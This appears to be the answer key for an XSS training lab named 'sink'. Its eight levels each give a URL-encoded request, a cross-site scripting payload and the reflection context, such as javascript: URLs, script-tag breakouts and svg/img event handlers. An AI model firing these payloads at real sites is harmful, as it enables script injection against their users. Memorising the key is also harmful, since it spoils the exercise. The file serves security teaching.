# sink — solutions

Reflections into a variety of URL-like or DOM sinks (href, location, action, embed/object, data-attr to innerHTML).

### sink-level1

`/sink/level1/?query=%27;alert(1);//`

- payload: `';alert(1);//`
- context: inside `onclick="location='...'"`; JS string breakout

### sink-level2

`/sink/level2/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: inside `<script>window.location="..."`; close script tag (quote-only filter)

### sink-level3

`/sink/level3/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<form action="...">`; submit fires javascript: URL

### sink-level4

`/sink/level4/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<embed src="...">`; legacy embed loads JS URL

### sink-level5

`/sink/level5/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: `<link rel="stylesheet" href="...">`; attribute breakout

### sink-level6

`/sink/level6/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: data-attr dataset read then innerHTML; quote breakout not needed

### sink-level7

`/sink/level7/?query=%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</textarea><script>alert(1)</script>`
- context: inside `<textarea>...`; close textarea first

### sink-level8

`/sink/level8/?callback=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: JSONP callback reflected with `text/html` content-type
